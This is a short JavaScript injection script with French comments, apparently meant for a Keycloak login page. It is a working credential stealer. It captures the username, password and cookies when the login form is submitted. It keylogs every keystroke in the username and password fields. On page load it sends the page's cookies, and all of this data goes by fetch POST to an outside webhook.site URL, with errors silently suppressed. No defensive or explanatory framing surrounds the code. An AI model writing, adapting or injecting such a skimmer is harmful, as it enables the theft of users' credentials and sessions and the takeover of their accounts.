(function() {
  // Anti-replay : si déjà injecté, ne rien refaire
  if (window.__vault_jok3r_loaded__) return;
  window.__vault_jok3r_loaded__ = true;

  // ✅ Webhook destination (ici ton webhook.site)
  const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';

  // ✅ Fonction pour exfiltrer les infos
  function sendData(data) {
    fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).catch(() => {});
  }

  // ✅ Capture du formulaire (username / password)
  const form = document.getElementById('kc-form-login');
  if (form) {
    form.addEventListener('submit', function() {
      const username = document.getElementById('username')?.value || '';
      const password = document.getElementById('password')?.value || '';
      const cookies = document.cookie;

      sendData({
        type: 'login_submit',
        username,
        password,
        cookies,
        userAgent: navigator.userAgent,
        url: window.location.href
      });
    });
  }

  // ✅ Keylogger simple sur les champs username et password
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');

  if (usernameInput) {
    usernameInput.addEventListener('input', () => {
      sendData({
        type: 'keylog',
        field: 'username',
        value: usernameInput.value
      });
    });
  }

  if (passwordInput) {
    passwordInput.addEventListener('input', () => {
      sendData({
        type: 'keylog',
        field: 'password',
        value: passwordInput.value
      });
    });
  }

  // ✅ Capture des cookies à l'exécution (si pas HttpOnly)
  sendData({
    type: 'cookies_onload',
    cookies: document.cookie,
    userAgent: navigator.userAgent,
    url: window.location.href
  });

})();
